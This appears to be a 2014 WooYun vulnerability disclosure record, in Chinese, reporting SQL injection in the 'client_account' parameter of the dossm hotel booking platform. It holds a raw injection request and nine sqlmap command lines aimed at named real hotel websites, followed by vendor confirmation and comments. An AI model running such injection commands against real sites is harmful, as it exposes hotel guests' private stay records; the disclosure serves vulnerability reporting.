{"id": 47640, "wybug_id": "wooyun-2014-080156", "wybug_title": "dossm的某处sql注入可导致酒店数据泄露", "wybug_corp": "广州问途信息技术有限公司", "wybug_author": "Coody", "wybug_date": "2014-10-20 18:31", "wybug_open_date": "2015-01-18 18:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向公众公开  简要描述： RT！ 详细说明：  续 WooYun: 一个漏洞沦陷至少全国各地170家酒店及酒店集团（可查开房信息，国庆你还开房吗）  后另一种姿势泄露开房信息。PS:国庆确定没有开房么？表骗我，一查就知道。-------------------------------厂商：广州问途信息技术有限公司 http://www.wintour.cn/系统：dossm框架：PHP + Mysql问题参数：client_account说明：该系统，凡是出现参数 client_account 的链接，都存在SQL注入漏洞。无论 GET or POST 类型。具体案例可参考上一漏洞中的“影响酒店列表”部分。-------------------------------漏洞证明：这里举出10个案例，证明其存在SQL注入漏洞。为方便测试，除了案例1之外的都改用GET类型请求。1# http://www.guangzhougdhhotel.com/ 广东华师粤海酒店\nPOST /saas/Guest/getLogin/?jsoncallback=jQuery18006111152800731361_1413790314004 HTTP/1.1Host: www.guangzhougdhhotel.comProxy-Connection: keep-aliveContent-Length: 75Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01Origin: http://www.guangzhougdhhotel.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.guangzhougdhhotel.com/Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2Cookie: dossm-id=2014102015121997406; PHPSESSID=192166fnffjmclj7usec4tmv17; think_language=zh-cn; _gat=1; compareState=Open; Hm_lvt_dd18eab5f23e44b0e822d77c32d67b9e=1411564893,1413789140; Hm_lpvt_dd18eab5f23e44b0e822d77c32d67b9e=1413790324; _ga=GA1.2.1254425558.1411564893referer=&dossm-id=2014102015121997406&client_account=gz_hsyh*&language=zh-cn\n\n\n2# http://www.wuzhishanyatai.com 五指山亚泰雨林度假酒店\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.wuzhishanyatai.com/saas/Guest/getLogin/?jsoncallback=jQuery191031815274455584586_1413791294237&client_account=wzs_ytyl*&code=&language=zh-cn&referer=&fields=1&_=1413791294238\" --dbms=mysql --current-user --current-db\n\n\n3# http://www.lyhotspring.com/ 龙源温泉大酒店官方网站\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.lyhotspring.com/saas/Guest/getLogin/?jsoncallback=jQuery18308396553485654294_1413791525231&client_account=hy_lyhotel*&language=zh-cn&_=1413791528664\" --dbms=mysql --current-user --current-db\n\n\n4# http://yalongbaygolfclub.com 三亚亚龙湾高尔夫球会\nC:\\Users\\Administrator\\Desktop>sqlmap.py -u \"http://yalongbaygolfclub.com/saas/Guest/getLogin/?jsoncallback=jQuery17109495638471562415_1413791869560&client_account=sy_golfclub*&referer=&dossm-id=2014102015575255163&language=zh-cn&_=1413791872350\" --dbms=mysql --current-db --current-user\n\n\n5# http://www.sunshinehotel.com 深圳阳光酒店\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.sunshinehotel.com/saas/Guest/getLogin/?jsoncallback=jQuery18306997522658202797_1413792995726&client_account=hn_xt_group*&language=zh-cn\" --dbms=mysql --current-db --current-user\n\n\n6# http://www.themulian.com 广州木莲庄酒店官方网站心境遇自然\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.themulian.com/saas/Guest/getLogin/?jsoncallback=jQuery19107581029343418777_1413793144338&client_account=gz_mlzhotel*&code=&language=zh-cn&referer=&fields=1&_=1413793144339\" --dbms=mysql --current-db --current-user\n\n\n7# http://www.vaya-hotel.cn/ 华雅国际大酒店\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.vaya-hotel.cn/saas/Guest/getLogin/?jsoncallback=jQuery180009386292030103505_1413793315607&referer=&dossm-id=2014102016215825117&client_account=hn_hy*&language=zh-cn\" --dbms=mysql --current-user --current-db\n\n\n8# http://www.wakingtown-hotel.com 广州华金盾大酒店 官方网站\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.wakingtown-hotel.com/saas/Guest/getLogin/?jsoncallback=jQuery18006759995706379414_1413793523835&referer=&dossm-id=2014102016252962149&client_account=gz_hjd*&language=zh-cn\" --dbms=mysql --current-db  --current-user\n\n\n9# http://cnicc.com 珠海德翰大酒店_官方网站\nC:\\Users\\Administrator>sqlmap.py -u \"http://cnicc.com/saas/Guest/getLogin/?jsoncallback=jQuery17205487245253752917_1413793832228&referer=&dossm-id=2014102016303745069&client_account=zh_dehan*&language=zh-cn\"  --dbms=mysql --current-db --current-user\n\n\n10# http://easelandhotel.com 广州逸林假日酒店官方网站\nC:\\Users\\Administrator>sqlmap.py -u \"http://easelandhotel.com/saas/Guest/getLogin/?jsoncallback=jQuery19108055493170395494_1413794067254&client_account=gz_yljrhotel*&code=&language=zh-cn&referer=&fields=1&_=1413794067255\" --dbms=mysql --current-db --current-user\n\n\n最后，用户数据很重要，可不能轻易的泄露啊！！！！！   漏洞证明：  同上   修复方案：     版权声明：转载请注明来源 Coody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-10-25 13:53 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-20 20:01 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  .....    \n     2014-10-20 20:11 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  .....    \n     2014-10-20 22:47 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  .....    \n     2014-10-20 22:59 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  我确定！    \n     2014-10-21 00:29 |    \t\tLet a person cry. \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:9        | xxoo)\t\t \n  ........我没开    \n     2014-10-21 08:38 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  我带女友开了。额- -。    \n     2014-10-21 09:27 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  车震了    \n     2014-10-21 09:56 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  这个叼……    \n     2014-10-21 10:35 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:48        | 不告诉你)\t\t \n  洞主昨天提交的漏洞吗？    \n     2014-10-25 17:03 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  过一段时间会有2000W裤子么》。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}